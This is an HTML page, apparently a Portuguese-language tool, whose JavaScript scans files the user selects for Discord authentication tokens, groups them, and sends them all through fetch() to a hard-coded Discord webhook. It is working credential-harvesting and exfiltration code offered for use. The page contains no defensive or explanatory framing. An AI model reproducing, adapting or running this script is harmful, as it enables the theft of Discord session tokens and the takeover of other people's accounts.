<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Coletar e Enviar Tokens Discord</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 20px;
  }
  pre {
    background: #272822;
    color: #f8f8f2;
    padding: 15px;
    border-radius: 8px;
    overflow-x: auto;
  }
  input[type=file] {
    margin-bottom: 10px;
  }
  button {
    cursor: pointer;
    padding: 10px 20px;
  }
</style>
</head>
<body>
<h1>Selecione arquivos para extrair tokens Discord</h1>
<input type="file" id="fileInput" multiple />
<button onclick="processFiles()">Processar e Enviar Tokens</button>

<pre id="output"></pre>

<script>
// Regex simples para tokens Discord (exemplo)
const TOKEN_REGEX = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}/g;

// Função simulada para pegar user id do token (exemplo pega a primeira parte antes do primeiro '.')
function getUserIdFromToken(token) {
  const parts = token.split('.');
  if(parts.length < 1) return null;
  // Em tokens Discord, a primeira parte é base64 codificado do user id (mas aqui só exemplo)
  // Na prática você precisaria decodificar base64. Para exemplo, retornarei texto cru
  return parts[0];
}

async function processFiles() {
  const input = document.getElementById('fileInput');
  const files = input.files;
  const idToTokens = {};

  if (files.length === 0) {
    alert("Selecione ao menos um arquivo.");
    return;
  }

  for(let file of files) {
    const text = await file.text();

    const tokens = text.match(TOKEN_REGEX);
    if (!tokens) continue;

    for(let token of tokens) {
      const userId = getUserIdFromToken(token);
      if(!userId) continue;

      if(!idToTokens[userId]) idToTokens[userId] = new Set();
      idToTokens[userId].add(token);
    }
  }

  // Converte Sets para arrays para facilitar envio
  const finalData = {};
  for(const [userId, tokensSet] of Object.entries(idToTokens)) {
    finalData[userId] = Array.from(tokensSet);
  }

  document.getElementById('output').textContent = JSON.stringify(finalData, null, 2);

  if(Object.keys(finalData).length === 0) {
    alert("Nenhum token válido encontrado.");
    return;
  }

  // Envia para webhook
  sendTokens(finalData);
}

async function sendTokens(data) {
  const webhookUrl = "https://discord.com/api/webhooks/1399887149754744862/EsaDqhc_PV9gl4ml0DImriuY8sx1TmiHKKYt7-g-3wDVDon0SgYWpdSh2Cb8vdEjfeT4";

  // Formata os campos para embed do Discord
  const fields = Object.entries(data).map(([userId, tokens]) => ({
    name: `User ID: ${userId}`,
    value: tokens.join('\n'),
    inline: false
  }));

  const payload = {
    content: "Tokens encontrados:",
    embeds: [{ fields }]
  };

  try {
    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if(res.ok) {
      alert("Tokens enviados com sucesso!");
    } else {
      alert("Erro ao enviar tokens: " + res.status);
    }
  } catch(e) {
    console.error(e);
    alert("Erro ao enviar tokens.");
  }
}
</script>
</body>
</html>
